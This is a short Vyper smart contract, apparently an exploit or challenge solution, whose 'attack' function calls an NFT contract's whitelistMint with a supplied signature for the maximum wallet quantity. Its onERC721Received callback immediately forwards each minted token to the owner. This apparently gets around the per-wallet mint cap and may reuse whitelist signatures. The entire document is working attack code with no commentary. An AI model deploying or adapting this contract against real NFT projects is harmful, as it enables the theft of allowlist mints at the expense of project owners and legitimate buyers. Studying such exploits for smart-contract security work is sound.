# @version ^0.3.7

from vyper.interfaces import ERC721 as IERC721

interface INFT:
    def MAX_WALLET() -> uint256: view
    def whitelistMint(
        to: address,
        qty: uint256,
        hash: bytes32, 
        signature: Bytes[65],
    ): payable

owner: immutable(address)

@external
@payable
def __init__():
    owner = tx.origin

@external
def attack(nft: address, hash: bytes32, signature: Bytes[65]):
    assert tx.origin == owner, "!owner"
    INFT(nft).whitelistMint(self, INFT(nft).MAX_WALLET(), hash, signature)

@external
def onERC721Received(
    operator: address,
    sender: address,
    tokenId: uint256,
    data: Bytes[32]
) -> bytes4:
    assert operator == self, "!operator"
    IERC721(msg.sender).transferFrom(self, owner, tokenId)
    return convert(
        method_id("onERC721Received(address,address,uint256,bytes)"),
        bytes4,
    )
